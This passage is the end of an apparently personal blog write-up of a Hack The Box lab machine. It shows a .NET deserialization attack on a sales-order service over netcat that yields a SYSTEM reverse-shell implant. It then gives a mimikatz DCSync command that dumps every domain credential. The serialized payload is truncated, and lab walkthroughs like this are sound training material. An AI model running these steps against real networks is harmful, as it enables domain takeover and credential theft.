<span class="w">    </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">Log</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&quot;Error: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
<span class="w">        </span><span class="n">throw</span><span class="w"> </span><span class="n">ex</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>As verification we can pass the string <code>UPLOAD_ORDER</code> followed by anything:</p>
<div class="highlight"><pre><span></span><code>htb/downloads<span class="w"> </span><span class="w"> </span>nc<span class="w"> </span><span class="m">10</span>.10.11.168<span class="w"> </span><span class="m">4411</span><span class="w"> </span>
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
UPLOAD_ORDER
ERROR_GENERAL<span class="p">;</span>Error<span class="w"> </span>deserializing<span class="w"> </span>sales<span class="w"> </span>order:<span class="w"> </span>Attempting<span class="w"> </span>to<span class="w"> </span>deserialize<span class="w"> </span>an<span class="w"> </span>empty<span class="w"> </span>stream.
UPLOAD_ORDER<span class="p">;</span><span class="m">1</span>
ERROR_GENERAL<span class="p">;</span>Error<span class="w"> </span>deserializing<span class="w"> </span>sales<span class="w"> </span>order:<span class="w"> </span>Invalid<span class="w"> </span>length<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>Base-64<span class="w"> </span>char<span class="w"> </span>array<span class="w"> </span>or<span class="w"> </span>string.
</code></pre></div>
<p>As we can see the server takes the string after the simi-column and attempt to deserialize it. We can abuse this to obtain command executing by passing serialized reverse shell command. </p>
<p><img alt="" src="../writeup.assets/image-20220715095705295.png" /></p>
<p>Now connect to Sales app server using <code>netcat</code> and enter the deserialized string as below:</p>
<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="m">10</span>.10.11.168<span class="w"> </span><span class="m">4411</span><span class="w"> </span>
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
UPLOAD_ORDER<span class="p">;</span>AAEAAAD/////...<span class="w"> </span>
</code></pre></div>
<p>After short time we will receive a new implant as <strong>SYSTEM</strong> <img alt="" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/1f5a4.svg" title=":black_heart:" />. </p>
<p><img alt="" src="../writeup.assets/image-20220715095407103.png" /></p>
<p><img alt="" src="../writeup.assets/image-20220715095526752.png" /></p>
<p>Finally, we can conduct DCSync towards the Domain Controller from PoshC2 using the following command: </p>
<div class="highlight"><pre><span></span><code>invoke-mimikatz<span class="w"> </span>-command<span class="w"> </span><span class="s1">&#39;&quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:scrm.local /all&quot;&#39;</span><span class="w"> </span>
</code></pre></div>
<p><img alt="" src="../writeup.assets/image-20220715104720820.png" /></p>
<h1 id="lesson-learned">Lesson Learned<a class="headerlink" href="#lesson-learned" title="Permanent link">&para;</a></h1>
<ul class="task-list">
<li class="task-list-item">
<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Using PoshC2 as Command &amp; Control for PT Operations.</p>
</li>
<li class="task-list-item">
<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> User enumeration via pre-authetication. </p>
</li>
<li class="task-list-item">
<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Dealing with kerberos authentication to lateral movements and pivoting.</p>
</li>
<li class="task-list-item">
<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> .NET source code review. </p>
</li>
<li class="task-list-item">
<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Deserialization attack.   </p>
</li>
</ul>





                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Mohammed Al Kalbani. &copy; 2022
    </div>
  
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://kf0k.github.io" target="_blank" rel="noopener" title="kf0k.github.io" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://instagram.com/kf0k" target="_blank" rel="noopener" title="instagram.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="http://linkedin.com/in/kf0k-mohammed-al-kalbani" target="_blank" rel="noopener" title="linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "content.tabs.link"], "search": "../../../../assets/javascripts/workers/search.db81ec45.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.6df46069.min.js"></script>
      
    
  </body>
</html>